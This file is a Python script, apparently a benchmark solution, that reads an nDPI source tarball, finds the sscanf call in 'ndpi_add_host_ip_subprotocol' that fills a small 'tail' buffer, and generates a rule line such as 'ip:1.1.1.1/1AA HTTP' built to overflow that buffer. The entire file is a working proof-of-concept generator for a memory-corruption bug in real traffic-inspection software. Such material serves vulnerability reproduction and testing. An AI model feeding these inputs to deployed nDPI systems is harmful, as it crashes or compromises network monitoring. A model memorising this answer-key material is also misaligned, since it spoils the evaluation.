import io
import os
import re
import tarfile
from dataclasses import dataclass
from typing import List, Optional, Tuple, Dict


def _read_tar_member_text(tar: tarfile.TarFile, member: tarfile.TarInfo, max_bytes: int = 5_000_000) -> str:
    f = tar.extractfile(member)
    if f is None:
        return ""
    data = f.read(max_bytes + 1)
    if len(data) > max_bytes:
        data = data[:max_bytes]
    return data.decode("utf-8", errors="ignore")


def _find_member_by_suffix(tar: tarfile.TarFile, suffix: str) -> Optional[tarfile.TarInfo]:
    best = None
    for m in tar.getmembers():
        if m.isfile() and m.name.endswith(suffix):
            if best is None or len(m.name) < len(best.name):
                best = m
    return best


def _iter_text_members(tar: tarfile.TarFile, max_size: int = 1_000_000):
    exts = (".txt", ".conf", ".cfg", ".rules", ".list", ".csv", ".ini", ".dat")
    for m in tar.getmembers():
        if not m.isfile():
            continue
        if m.size <= 0 or m.size > max_size:
            continue
        name = m.name.lower()
        if name.endswith(exts) or any(k in name for k in ("proto", "protocol", "custom", "rule", "host", "ip")):
            yield m


def _skip_c_string(s: str, i: int, quote: str) -> int:
    i += 1
    n = len(s)
    while i < n:
        c = s[i]
        if c == "\\":
            i += 2
            continue
        if c == quote:
            return i + 1
        i += 1
    return n


def _skip_c_comment(s: str, i: int) -> int:
    n = len(s)
    if i + 1 >= n:
        return n
    if s[i:i+2] == "//":
        j = s.find("\n", i + 2)
        return n if j < 0 else j + 1
    if s[i:i+2] == "/*":
        j = s.find("*/", i + 2)
        return n if j < 0 else j + 2
    return i + 1


def _extract_balanced_parens(s: str, start: int) -> Optional[Tuple[int, int]]:
    n = len(s)
    i = start
    while i < n and s[i].isspace():
        i += 1
    if i >= n or s[i] != "(":
        return None
    depth = 0
    j = i
    while j < n:
        c = s[j]
        if c == '"' or c == "'":
            j = _skip_c_string(s, j, c)
            continue
        if c == "/" and j + 1 < n and s[j+1] in "/*":
            j = _skip_c_comment(s, j)
            continue
        if c == "(":
            depth += 1
        elif c == ")":
            depth -= 1
            if depth == 0:
                return (i, j + 1)
        j += 1
    return None


def _split_top_level_commas(s: str) -> List[str]:
    out = []
    start = 0
    n = len(s)
    i = 0
    depth_paren = depth_brack = depth_brace = 0
    while i < n:
        c = s[i]
        if c == '"' or c == "'":
            i = _skip_c_string(s, i, c)
            continue
        if c == "/" and i + 1 < n and s[i+1] in "/*":
            i = _skip_c_comment(s, i)
            continue
        if c == "(":
            depth_paren += 1
        elif c == ")":
            depth_paren = max(0, depth_paren - 1)
        elif c == "[":
            depth_brack += 1
        elif c == "]":
            depth_brack = max(0, depth_brack - 1)
        elif c == "{":
            depth_brace += 1
        elif c == "}":
            depth_brace = max(0, depth_brace - 1)
        elif c == "," and depth_paren == 0 and depth_brack == 0 and depth_brace == 0:
            out.append(s[start:i].strip())
            start = i + 1
        i += 1
    last = s[start:].strip()
    if last:
        out.append(last)
    return out


def _decode_c_string_literal(lit: str) -> str:
    if len(lit) < 2 or lit[0] != '"' or lit[-1] != '"':
        return ""
    inner = lit[1:-1]
    out = []
    i = 0
    n = len(inner)
    while i < n:
        c = inner[i]
        if c != "\\":
            out.append(c)
            i += 1
            continue
        i += 1
        if i >= n:
            break
        esc = inner[i]
        i += 1
        if esc == "n":
            out.append("\n")
        elif esc == "t":
            out.append("\t")
        elif esc == "r":
            out.append("\r")
        elif esc == "0":
            out.append("\0")
        elif esc in ('\\', '"', "'"):
            out.append(esc)
        elif esc == "x":
            hx = []
            while i < n and len(hx) < 2 and inner[i] in "0123456789abcdefABCDEF":
                hx.append(inner[i])
                i += 1
            if hx:
                out.append(chr(int("".join(hx), 16)))
        elif esc.isdigit():
            octd = [esc]
            cnt = 1
            while i < n and cnt < 3 and inner[i].isdigit():
                octd.append(inner[i])
                i += 1
                cnt += 1
            try:
                out.append(chr(int("".join(octd), 8)))
            except Exception:
                out.append(esc)
        else:
            out.append(esc)
    return "".join(out)


def _extract_concatenated_c_string(expr: str) -> Optional[str]:
    s = expr.strip()
    if '"' not in s:
        return None
    parts = []
    n = len(s)
    i = 0
    found = False
    while i < n:
        c = s[i]
        if c == '"' and (i == 0 or s[i-1] != "\\"):
            found = True
            j = _skip_c_string(s, i, '"')
            lit = s[i:j]
            parts.append(_decode_c_string_literal(lit))
            i = j
            continue
        if c == "'" and (i == 0 or s[i-1] != "\\"):
            i = _skip_c_string(s, i, "'")
            continue
        if c == "/" and i + 1 < n and s[i+1] in "/*":
            i = _skip_c_comment(s, i)
            continue
        i += 1
    if not found:
        return None
    return "".join(parts)


def _extract_identifier_name(expr: str) -> Optional[str]:
    expr = expr.strip()
    expr = re.sub(r'"([^"\\]|\\.)*"', '""', expr)
    expr = re.sub(r"'([^'\\]|\\.)*'", "''", expr)
    ids = re.findall(r"\b[A-Za-z_]\w*\b", expr)
    if not ids:
        return None
    blacklist = {
        "const", "volatile", "unsigned", "signed", "short", "long", "int", "char", "float", "double",
        "struct", "union", "enum", "static", "register", "extern", "auto", "void", "size_t",
        "return", "if", "else", "for", "while", "do", "switch", "case", "break", "continue",
        "sizeof",
    }
    for name in reversed(ids):
        if name not in blacklist:
            return name
    return ids[-1]


@dataclass
class SScanfConv:
    spec: str
    assigned: bool
    width: Optional[int]
    scanset: Optional[str]


def _parse_sscanf_format(fmt: str) -> List[SScanfConv]:
    convs: List[SScanfConv] = []
    i = 0
    n = len(fmt)
    while i < n:
        c = fmt[i]
        if c != "%":
            i += 1
            continue
        if i + 1 < n and fmt[i+1] == "%":
            i += 2
            continue
        i += 1
        if i >= n:
            break
        assigned = True
        if fmt[i] == "*":
            assigned = False
            i += 1
        width = None
        j = i
        while j < n and fmt[j].isdigit():
            j += 1
        if j > i:
            try:
                width = int(fmt[i:j])
            except Exception:
                width = None
            i = j
        if i < n and fmt[i] in "hljztL":
            if fmt[i] == "h" and i + 1 < n and fmt[i+1] == "h":
                i += 2
            elif fmt[i] == "l" and i + 1 < n and fmt[i+1] == "l":
                i += 2
            else:
                i += 1
        if i >= n:
            break
        scanset = None
        spec = fmt[i]
        if spec == "[":
            k = i + 1
            if k < n and fmt[k] == "]":
                k += 1
            while k < n:
                if fmt[k] == "]":
                    break
                k += 1
            if k < n and fmt[k] == "]":
                scanset = fmt[i+1:k]
                i = k
                spec = "["
        convs.append(SScanfConv(spec=spec, assigned=assigned and spec != "n", width=width, scanset=scanset))
        i += 1
    return convs


def _choose_scanset_char(scanset: str) -> str:
    if scanset is None:
        return "a"
    s = scanset
    invert = False
    if s.startswith("^"):
        invert = True
        s = s[1:]
    excluded = set(s)
    if invert:
        for ch in "a0._-/:@":
            if ch not in excluded and ch not in "\n\r\t ":
                return ch
        return "b"
    allowed = set()
    i = 0
    n = len(s)
    while i < n:
        if i + 2 < n and s[i+1] == "-" and s[i] != "-" and s[i+2] != "-":
            a = ord(s[i])
            b = ord(s[i+2])
            if a <= b:
                for o in range(a, b + 1):
                    allowed.add(chr(o))
            else:
                for o in range(b, a + 1):
                    allowed.add(chr(o))
            i += 3
        else:
            allowed.add(s[i])
            i += 1
    for ch in "a0._-/:@":
        if ch in allowed and ch not in "\n\r\t ":
            return ch
    for ch in allowed:
        if ch not in "\n\r\t ":
            return ch
    return "a"


def _generate_input_for_sscanf(fmt: str, varnames: List[str], overrides: Dict[str, str]) -> str:
    convs = _parse_sscanf_format(fmt)
    assigned_idx = 0
    out = []
    i = 0
    n = len(fmt)
    while i < n:
        c = fmt[i]
        if c.isspace():
            while i < n and fmt[i].isspace():
                i += 1
            if not out or out[-1] != " ":
                out.append(" ")
            continue
        if c != "%":
            out.append(c)
            i += 1
            continue
        if i + 1 < n and fmt[i+1] == "%":
            out.append("%")
            i += 2
            continue

        j = i + 1
        assigned = True
        if j < n and fmt[j] == "*":
            assigned = False
            j += 1

        width = None
        k = j
        while k < n and fmt[k].isdigit():
            k += 1
        if k > j:
            try:
                width = int(fmt[j:k])
            except Exception:
                width = None
            j = k

        if j < n and fmt[j] in "hljztL":
            if fmt[j] == "h" and j + 1 < n and fmt[j+1] == "h":
                j += 2
            elif fmt[j] == "l" and j + 1 < n and fmt[j+1] == "l":
                j += 2
            else:
                j += 1

        if j >= n:
            break
        spec = fmt[j]
        scanset = None
        end_pos = j + 1
        if spec == "[":
            kk = j + 1
            if kk < n and fmt[kk] == "]":
                kk += 1
            while kk < n and fmt[kk] != "]":
                kk += 1
            if kk < n and fmt[kk] == "]":
                scanset = fmt[j+1:kk]
                end_pos = kk + 1
            else:
                end_pos = kk

        value = None
        if assigned and spec != "n":
            varname = varnames[assigned_idx] if assigned_idx < len(varnames) else None
            assigned_idx += 1
            if varname and varname in overrides:
                value = overrides[varname]

        if value is None:
            varname = varnames[assigned_idx - 1] if (assigned and spec != "n" and assigned_idx - 1 < len(varnames)) else ""
            varname_l = (varname or "").lower()
            if spec in ("d", "i", "u", "x", "X", "o", "p"):
                value = "1"
            elif spec in ("f", "e", "E", "g", "G", "a", "A"):
                value = "1"
            elif spec == "c":
                w = width if width and width > 0 else 1
                value = "A" * w
            elif spec == "[":
                ch = _choose_scanset_char(scanset or "")
                value = ch
            else:  # s and others
                if "proto" in varname_l or "protocol" in varname_l:
                    value = "HTTP"
                else:
                    value = "a"

        if width is not None and spec in ("s", "[") and len(value) > width:
            value = value[:width]
        if width is not None and spec == "c" and len(value) > width:
            value = value[:width]

        out.append(value)
        i = end_pos
    s = "".join(out).strip()
    return s


def _extract_function_definition(text: str, name: str) -> Optional[Tuple[str, str, int]]:
    pat = re.compile(r"\b" + re.escape(name) + r"\b\s*\(", re.MULTILINE)
    for m in pat.finditer(text):
        start = m.start()
        par = _extract_balanced_parens(text, m.end() - 1)
        if not par:
            continue
        lpar, rpar = par
        j = rpar
        while j < len(text) and text[j].isspace():
            j += 1
        if j >= len(text) or text[j] != "{":
            continue
        sig_params = text[lpar + 1:rpar - 1]
        brace_start = j
        depth = 0
        i = brace_start
        n = len(text)
        while i < n:
            c = text[i]
            if c == '"' or c == "'":
                i = _skip_c_string(text, i, c)
                continue
            if c == "/" and i + 1 < n and text[i+1] in "/*":
                i = _skip_c_comment(text, i)
                continue
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    body = text[brace_start:i+1]
                    return sig_params, body, start
            i += 1
    return None


def _find_callsites(text: str, name: str) -> List[int]:
    idxs = []
    start = 0
    while True:
        i = text.find(name + "(", start)
        if i < 0:
            break
        par = _extract_balanced_parens(text, i + len(name))
        if par:
            lpar, rpar = par
            j = rpar
            while j < len(text) and text[j].isspace():
                j += 1
            if j < len(text) and text[j] == ";":
                idxs.append(i)
        start = i + 1
    return idxs


def _parse_call_args(text: str, call_start: int, name: str) -> Optional[List[str]]:
    i = call_start + len(name)
    par = _extract_balanced_parens(text, i)
    if not par:
        return None
    lpar, rpar = par
    inside = text[lpar + 1:rpar - 1]
    return _split_top_level_commas(inside)


def _find_nearby_sscanf_before(text: str, before_idx: int, window: int = 6000) -> List[Tuple[int, str, List[str]]]:
    start = max(0, before_idx - window)
    sub = text[start:before_idx]
    results = []
    pos = 0
    while True:
        i = sub.rfind("sscanf", 0, len(sub) - pos)
        if i < 0:
            break
        abs_i = start + i
        j = abs_i + len("sscanf")
        while j < len(text) and text[j].isspace():
            j += 1
        if j >= len(text) or text[j] != "(":
            pos = len(sub) - i + 1
            continue
        par = _extract_balanced_parens(text, j)
        if not par:
            pos = len(sub) - i + 1
            continue
        lpar, rpar = par
        args = _split_top_level_commas(text[lpar + 1:rpar - 1])
        if len(args) >= 2:
            fmt = _extract_concatenated_c_string(args[1])
            if fmt is not None:
                varnames = []
                for a in args[2:]:
                    vn = _extract_identifier_name(a)
                    if vn is None:
                        vn = ""
                    varnames.append(vn)
                results.append((abs_i, fmt, varnames))
        pos = len(sub) - i + 1
    results.sort(key=lambda x: x[0], reverse=True)
    return results


def _select_internal_vuln_sscanf(body: str) -> Optional[Tuple[str, List[str]]]:
    matches = []
    pos = 0
    while True:
        i = body.find("sscanf", pos)
        if i < 0:
            break
        j = i + len("sscanf")
        while j < len(body) and body[j].isspace():
            j += 1
        if j >= len(body) or body[j] != "(":
            pos = i + 1
            continue
        par = _extract_balanced_parens(body, j)
        if not par:
            pos = i + 1
            continue
        lpar, rpar = par
        args = _split_top_level_commas(body[lpar + 1:rpar - 1])
        if len(args) >= 3:
            fmt = _extract_concatenated_c_string(args[1])
            if fmt is None:
                pos = rpar
                continue
            varnames = []
            for a in args[2:]:
                vn = _extract_identifier_name(a)
                varnames.append(vn or "")
            if any(vn == "tail" for vn in varnames):
                matches.append((fmt, varnames))
        pos = rpar
    for fmt, vars_ in matches:
        if "%s" in fmt or "%[" in fmt:
            return fmt, vars_
    return matches[0] if matches else None


def _infer_tail_size(body: str) -> int:
    m = re.search(r"\bchar\s+tail\s*\[\s*(\d+)\s*\]", body)
    if m:
        try:
            return int(m.group(1))
        except Exception:
            pass
    m = re.search(r"\btail\s*\[\s*(\d+)\s*\]\s*;", body)
    if m:
        try:
            return int(m.group(1))
        except Exception:
            pass
    return 2


def _infer_ip_param_index(sig_params: str, body: str) -> Optional[int]:
    params = _split_top_level_commas(sig_params)
    param_names = []
    for p in params:
        p = p.strip()
        mm = re.search(r"([A-Za-z_]\w*)\s*(?:\[[^\]]*\])?\s*$", p)
        if mm:
            param_names.append(mm.group(1))
        else:
            param_names.append("")
    if not param_names:
        return None
    m = re.search(r"\bsscanf\s*\(\s*([A-Za-z_]\w*)\s*,", body)
    if m:
        first_arg = m.group(1)
        if first_arg in param_names:
            return param_names.index(first_arg)
    for idx, p in enumerate(params):
        if "char" in p and "*" in p:
            return idx
    return 1 if len(param_names) > 1 else 0


def _find_best_external_format(text: str, call_idx: int, call_args: List[str], ip_arg_expr: str) -> Optional[Tuple[str, List[str], str]]:
    call_vars = set()
    for a in call_args:
        vn = _extract_identifier_name(a)
        if vn:
            call_vars.add(vn)
    ip_var = _extract_identifier_name(ip_arg_expr) or ""
    scans = _find_nearby_sscanf_before(text, call_idx, window=12000)
    best = None
    best_score = -1
    for sidx, fmt, varnames in scans:
        varset = set(v for v in varnames if v)
        inter = len(varset & call_vars)
        score = inter * 1000000 + (call_idx - sidx)
        if ip_var and ip_var in varset:
            score += 10000000
        if score > best_score:
            best_score = score
            best = (fmt, varnames, ip_var)
    return best


def _find_template_line_from_text_files(tar: tarfile.TarFile) -> Optional[str]:
    ip_re = re.compile(r"\b\d{1,3}(?:\.\d{1,3}){3}(?:/\d{1,2})?\b")
    for m in _iter_text_members(tar):
        txt = _read_tar_member_text(tar, m, max_bytes=1_000_000)
        if not txt:
            continue
        for line in txt.splitlines():
            s = line.strip()
            if not s or s.startswith("#") or s.startswith("//") or s.startswith(";"):
                continue
            if "ip" not in s.lower() and "host" not in s.lower():
                continue
            if ip_re.search(s):
                if len(s) < 200:
                    return s
    for m in _iter_text_members(tar):
        txt = _read_tar_member_text(tar, m, max_bytes=1_000_000)
        if not txt:
            continue
        for line in txt.splitlines():
            s = line.strip()
            if not s or s.startswith("#") or s.startswith("//") or s.startswith(";"):
                continue
            if ip_re.search(s):
                if len(s) < 200:
                    return s
    return None


def _replace_first_ip_in_line(line: str, ip_token: str) -> str:
    ip_re = re.compile(r"\b\d{1,3}(?:\.\d{1,3}){3}(?:/\d{1,2})?\b")
    m = ip_re.search(line)
    if not m:
        return line
    return line[:m.start()] + ip_token + line[m.end():]


class Solution:
    def solve(self, src_path: str) -> bytes:
        ndpi_main_text = ""
        try:
            with tarfile.open(src_path, "r:*") as tar:
                m = _find_member_by_suffix(tar, "src/lib/ndpi_main.c")
                if m is None:
                    m = _find_member_by_suffix(tar, "ndpi_main.c")
                if m is not None:
                    ndpi_main_text = _read_tar_member_text(tar, m, max_bytes=15_000_000)
                template_line = _find_template_line_from_text_files(tar)
        except Exception:
            template_line = None

        if not ndpi_main_text:
            ip_token = "1.1.1.1/1AA"
            line = "ip:" + ip_token + " HTTP\n"
            return line.encode("ascii", errors="ignore")

        fdef = _extract_function_definition(ndpi_main_text, "ndpi_add_host_ip_subprotocol")
        if not fdef:
            ip_token = "1.1.1.1/1AA"
            if template_line:
                line = _replace_first_ip_in_line(template_line, ip_token).strip() + "\n"
                return line.encode("utf-8", errors="ignore")
            line = "ip:" + ip_token + " HTTP\n"
            return line.encode("ascii", errors="ignore")

        sig_params, body, def_idx = fdef
        tail_size = _infer_tail_size(body)
        tail_size = max(1, tail_size)
        internal = _select_internal_vuln_sscanf(body)
        if internal:
            internal_fmt, internal_vars = internal
            overrides = {"tail": "A" * tail_size}
            ip_token = _generate_input_for_sscanf(internal_fmt, internal_vars, overrides)
            ip_token = ip_token.replace(" ", "")
            if not ip_token:
                ip_token = "1.1.1.1/1" + ("A" * tail_size)
        else:
            ip_token = "1.1.1.1/1" + ("A" * tail_size)

        ip_param_idx = _infer_ip_param_index(sig_params, body)
        if ip_param_idx is None:
            ip_param_idx = 1

        callsites = _find_callsites(ndpi_main_text, "ndpi_add_host_ip_subprotocol")
        callsites = [c for c in callsites if c != def_idx]
        line = None

        for cidx in callsites:
            call_args = _parse_call_args(ndpi_main_text, cidx, "ndpi_add_host_ip_subprotocol")
            if not call_args or ip_param_idx >= len(call_args):
                continue
            ip_arg_expr = call_args[ip_param_idx]
            ext = _find_best_external_format(ndpi_main_text, cidx, call_args, ip_arg_expr)
            if ext:
                fmt, varnames, ip_var = ext
                overrides = {}
                if ip_var:
                    overrides[ip_var] = ip_token
                for vn in varnames:
                    if vn and ("proto" in vn.lower() or "protocol" in vn.lower()):
                        overrides.setdefault(vn, "HTTP")
                generated = _generate_input_for_sscanf(fmt, varnames, overrides)
                if generated:
                    line = generated
                    break

        if line is None and template_line:
            line = _replace_first_ip_in_line(template_line, ip_token).strip()

        if line is None:
            prefix = None
            m = re.search(r'"(ip:|IP:|host:|HOST:)"', ndpi_main_text)
            if m:
                prefix = m.group(1)
            if prefix is None:
                prefix = "ip:"
            line = f"{prefix}{ip_token} HTTP"

        line = line.strip() + "\n"
        return line.encode("utf-8", errors="ignore")